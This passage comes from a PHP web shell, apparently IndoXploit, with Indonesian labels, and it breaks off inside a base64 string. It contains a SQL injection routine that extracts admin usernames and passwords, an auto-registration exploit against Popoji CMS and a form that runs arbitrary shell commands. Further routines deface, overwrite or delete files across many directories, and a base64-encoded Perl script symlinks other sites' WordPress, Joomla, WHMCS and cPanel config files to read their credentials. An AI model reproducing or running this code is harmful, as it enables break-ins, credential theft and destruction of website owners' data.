            foreach($param_list as $param) {
                preg_match_all("/$param-(.*?)\">/", $curl, $id);
                foreach($id[1] as $stat) {
                    $pecah = explode("-", $stat);
                    $statis .= $pecah[0];
                    $sisa .= $pecah[1];
                    break;
                }
                foreach($admin as $adminweb) {
                    $curl_admin = ngcurl("$url/$adminweb");
                    if(preg_match("/administrator|username|password/i", $curl_admin) AND !preg_match("/not found|forbidden|404|403|500/i", $curl_admin)) {
                        $login .= "$url/$adminweb";
                        break;
                    }
                }
                $sql = ngcurl("$url/$param-$statis'/*!50000UniON*/+/*!50000SeLeCT*/+/*!50000cOnCAt*/(0x696e646f78706c6f6974,0x3c6c693e,username,0x20,password,0x3c6c693e)+from+users--+---+-$sisa");
                preg_match("/<meta name=\"description\" content=\"(.*?)\">/", $sql, $up);
                preg_match("/<li>(.*)<li>/", $up[1], $akun);
                $data = explode(" ", $akun[1]);
                echo "[+] URL: $url\n";
                //echo "[+] param: $param\n";
                if(htmlspecialchars($curl) !== htmlspecialchars($sql)) {
                    if(preg_match("/indoxploit/", $sql)) {
                        //echo "[ Injection Successfully ]\n";
                        if($data[0] == "" || $data[1] == "") {
                            echo "[+] Not Injected :(\n\n";
                            break;
                        } else {
                            echo "[+] username: ".$data[0]."\n";
                            $passwd = $real_pass[$data[1]];
                            if($passwd == "") {
                                $passwd = $data[1];
                                simpen($data[1]);
                            }
                            echo "[+] password: $passwd\n";
                        }
                        if($login == "") {
                            echo "[+] Login Admin ga ketemu :(\n\n";
                        } else {
                            echo "[+] Login: $login\n\n";
                        }
                        break;
                    } else {
                        echo "[+] Not Injected :(\n\n";
                        break;
                    }
                } else {
                    echo "[+] Not Injected :(\n\n";
                    break;
                }
            }
        }
    }
    } elseif($_GET['do'] == 'popoji') {
    
    set_time_limit(0);
    error_reporting(0);
    
    function dav($url, $post=null) {
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_URL, $url);
              if($post != null) {
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
              }
              curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
              curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HHTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_HEADER, 0);
        return curl_exec($ch);
              curl_close($ch);
    }
    
    $sites = explode("\r\n", $_POST['url']);
    $user = "indoxploit";
    $pass = $user;
    $email = htmlspecialchars($_POST['email']);
    if($_POST['hajar']) {
        echo "<span style='font-size: 25px; text-decoration: underline; color: lime; margin-bottom: 20px;'>Result Gannnnn</span><p>";
        if(!filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
            foreach($sites as $url) {
                if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
                    $url = "http://".$url;
                } else {
                    $url = $url;
                }
                echo "[+] Nyecan -> $url<br>";
                $post_register = array(
                    "username" => $user,
                    "email" => $email,
                    "password" => $pass,
                    "re-password" => $pass,
                    );
                $register = dav("$url/po-admin/actregister.php", $post_register);
                echo "[+] Register ";
                if(!preg_match("/404|headers already sent|disabled for security reasons|Please type another email!/", $register) AND preg_match("/SUCCESS!!!|>Check your email for next step. Thank you!/", $register)) {
                    echo "<font color=lime>OK!</font><br>";
                    echo "[+] <font color=gold>Cek emailmu buat aktivasi</font><br>";
                    echo "[+] u/p: <font color=lime>$user</font><br><br>";
                    $post_login = array(
                        "username" => $user,
                        "password" => $pass,
                        );
                } else {
                    echo "<font color=red>Gagal!</font><br><br>";
                }
            }
        } else {
            echo "<font color=red>Emailmu ga valid bosss, email harus valid biar bisa masuk token registrasinyaa.</font>";
        }
    } else {
    ?>
    <center>
    <header>POPOJI Auto Registration</header>
    <form method="post">
    Email: <br>
    <input type="text" name="email" value="trciksterlicikarus@gmail.com" placeholder="email@asu.com" required><br>
    Domains: <br>
    <textarea name="url"></textarea><br>
    <input type="submit" name="hajar" value="Xploit!">
    </form>
    </center>
    <?php
    }
    } elseif($_GET['do'] == 'cmd') {
        echo "<form method='post'>
        <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
        <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
        </form>";
        if($_POST['do_cmd']) {
            echo "<pre>".exe($_POST['cmd'])."</pre>";
        }
    } elseif($_GET['do'] == 'mass_deface') {
            echo "<center><form action=\"\" method=\"post\">\n";
        $dirr=$_POST['d_dir'];
        $index = $_POST["script"];
        $index = str_replace('"',"'",$index);
        $index = stripslashes($index);
        function edit_file($file,$index){
            if (is_writable($file)) {
            clear_fill($file,$index);
            echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
            } 
            else {
                echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
                }
                }
        function hapus_massal($dir,$namafile) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lokasi = $dirc.'/'.$namafile;
                    if($dirb === '.') {
                        if(file_exists("$dir/$namafile")) {
                            unlink("$dir/$namafile");
                        }
                    } elseif($dirb === '..') {
                        if(file_exists("".dirname($dir)."/$namafile")) {
                            unlink("".dirname($dir)."/$namafile");
                        }
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                if(file_exists($lokasi)) {
                                    echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                                    unlink($lokasi);
                                    $idx = hapus_massal($dirc,$namafile);
                                }
                            }
                        }
                    }
                }
            }
        }
        function clear_fill($file,$index){
            if(file_exists($file)){
                $handle = fopen($file,'w');
                fwrite($handle,'');
                fwrite($handle,$index);
                fclose($handle);  } }
    
        function gass(){
            global $dirr , $index ;
            chdir($dirr);
            $me = str_replace(dirname(__FILE__).'/','',__FILE__);
            $files = scandir($dirr) ;
            $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
            sort($files);
            $n = 0 ;
            foreach ($files as $file){
                if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
                    echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
                    edit_file($file,$index);
                    flush();
                    $n = $n +1 ;
                    } 
                    }
                    echo "<br>";
                    echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
                        }
        function ListFiles($dirrall) {
    
        if($dh = opendir($dirrall)) {
    
           $files = Array();
           $inner_files = Array();
           $me = str_replace(dirname(__FILE__).'/','',__FILE__);
           $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
            while($file = readdir($dh)) {
                if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                    if(is_dir($dirrall . "/" . $file)) {
                        $inner_files = ListFiles($dirrall . "/" . $file);
                        if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                    } else {
                        array_push($files, $dirrall . "/" . $file);
                    }
                }
                }
    
                closedir($dh);
                return $files;
            }
        }
        function gass_all(){
            global $index ;
            $dirrall=$_POST['d_dir'];
            foreach (ListFiles($dirrall) as $key=>$file){
                $file = str_replace('//',"/",$file);
                echo "<center><strong>$file</strong> ===>";
                edit_file($file,$index);
                flush();
            }
            $key = $key+1;
        echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
        function sabun_massal($dir,$namafile,$isi_script) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lokasi = $dirc.'/'.$namafile;
                    if($dirb === '.') {
                        file_put_contents($lokasi, $isi_script);
                    } elseif($dirb === '..') {
                        file_put_contents($lokasi, $isi_script);
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                echo "[<font color=lime>DONE</font>] $lokasi<br>";
                                file_put_contents($lokasi, $isi_script);
                                $idx = sabun_massal($dirc,$namafile,$isi_script);
                            }
                        }
                    }
                }
            }
        }
        if($_POST['mass'] == 'onedir') {
            echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
            $ini="http://";
            $mainpath=$_POST[d_dir];
            $file=$_POST[d_file];
            $dir=opendir("$mainpath");
            $code=base64_encode($_POST[script]);
            $indx=base64_decode($code);
            while($row=readdir($dir)){
            $start=@fopen("$row/$file","w+");
            $finish=@fwrite($start,$indx);
            if ($finish){
                echo"$ini$row/$file\n";
                }
            }
            echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
            $mainpath=$_POST[d_dir];$file=$_POST[d_file];
            $dir=opendir("$mainpath");
            $code=base64_encode($_POST[script]);
            $indx=base64_decode($code);
            while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
            $finish=@fwrite($start,$indx);
            if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
            }
    
        }
        elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
        elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
        elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
        elseif($_POST['mass'] == 'massdeface') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";	}
        else {
            echo "
            <center><font style='text-decoration: underline;'>
            Select Type:<br>
            </font>
            <select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
            <option value=\"onedir\">Mass Deface 1 Dir</option>
            <option value=\"massdeface\">Mass Deface ALL Dir</option>
            <option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
            <option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
            <option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
            <font style='text-decoration: underline;'>Folder:</font><br>
            <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
            <font style='text-decoration: underline;'>Filename:</font><br>
            <input type='text' name='d_file' value='pain.php' style='width: 450px;' height='10'><br>
            <font style='text-decoration: underline;'>Index File:</font><br>
            <textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.Painlover</textarea><br>
            <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
            </form></center>";
            }
    } elseif($_GET['do'] == 'mass_delete') {
        function hapus_massal($dir,$namafile) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lokasi = $dirc.'/'.$namafile;
                    if($dirb === '.') {
                        if(file_exists("$dir/$namafile")) {
                            unlink("$dir/$namafile");
                        }
                    } elseif($dirb === '..') {
                        if(file_exists("".dirname($dir)."/$namafile")) {
                            unlink("".dirname($dir)."/$namafile");
                        }
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                if(file_exists($lokasi)) {
                                    echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                                    unlink($lokasi);
                                    $idx = hapus_massal($dirc,$namafile);
                                }
                            }
                        }
                    }
                }
            }
        }
        if($_POST['start']) {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            hapus_massal($_POST['d_dir'], $_POST['d_file']);
            echo "</div>";
        } else {
        echo "<center>";
        echo "<form method='post'>
        <font style='text-decoration: underline;'>Folder:</font><br>
        <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
        <font style='text-decoration: underline;'>Filename:</font><br>
        <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
        <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
        </form></center>";
        }
    } elseif($_GET['do'] == 'config') {
        $idx = mkdir("pain_config", 0777);
        $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
        $htc = fopen("c0der_sconfig/.htaccess","w");
        fwrite($htc, $isi_htc);
        fclose($htc);
        if(preg_match("/vhosts|vhost/", $dir)) {
            $link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
            $vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8n